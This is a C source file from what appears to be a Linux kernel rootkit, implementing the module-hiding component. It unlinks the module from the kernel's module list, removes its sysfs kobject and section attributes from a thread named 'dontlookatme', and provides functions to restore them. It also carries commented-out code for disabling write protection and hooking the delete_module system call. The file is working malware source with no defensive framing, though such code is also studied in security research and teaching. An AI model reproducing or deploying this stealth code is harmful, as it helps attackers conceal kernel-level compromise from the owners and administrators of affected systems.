#include "code_hiding.h"
#include "hooking.h"

static struct list_head * tmp_head;
static struct kobject tmp_kobj;
static struct module_sect_attrs * tmp_sect;
static struct module_notes_attrs * tmp_notes;
static int (*orig_sys_delete_module)(const char * name, int flags);

static int my_delete_module(const char * name, int flags){
  if(strcmp(name, "rootkit") == 0){  //TODO: replace string with macro
    printk(KERN_INFO "rootkit wants back to it's own kind\n");
    mutex_lock(&module_mutex);
    list_add(&THIS_MODULE->list, tmp_head);
    mutex_unlock(&module_mutex);
  }
  return orig_sys_delete_module(name, flags);
}

static int hiding_thread(void * data){
  mutex_lock(&module_mutex);
  printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");

  //disable_wp();
  //orig_sys_delete_module = syscall_table[__NR_delete_module];
  //syscall_table[__NR_delete_module] = my_delete_module;
  //enable_wp();

  tmp_head = THIS_MODULE->list.prev;	
  list_del(&THIS_MODULE->list);

  tmp_kobj = THIS_MODULE->mkobj.kobj;
  kobject_del(&THIS_MODULE->mkobj.kobj);
  tmp_sect = THIS_MODULE->sect_attrs;
  tmp_notes = THIS_MODULE->notes_attrs;
  THIS_MODULE->sect_attrs = NULL;
  THIS_MODULE->notes_attrs = NULL;

  mutex_unlock(&module_mutex);
  return 0;
}

void hide_code(void){
  kthread_run(hiding_thread, NULL, "dontlookatme");
}

void make_module_removable(){
	THIS_MODULE->mkobj.kobj = tmp_kobj;
  THIS_MODULE->sect_attrs = tmp_sect;
  THIS_MODULE->notes_attrs = tmp_notes;
	kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->mkobj.kobj.name);
}

int unhide_code(void * data) {
  //disable_wp();
  //syscall_table[__NR_delete_module] = orig_sys_delete_module;
  //enable_wp();
  printk(KERN_INFO "rootkit wants back to it's own kind\n");
  mutex_lock(&module_mutex);
  make_module_removable();
  list_add(&THIS_MODULE->list, tmp_head);
  mutex_unlock(&module_mutex);
  return 0;
}

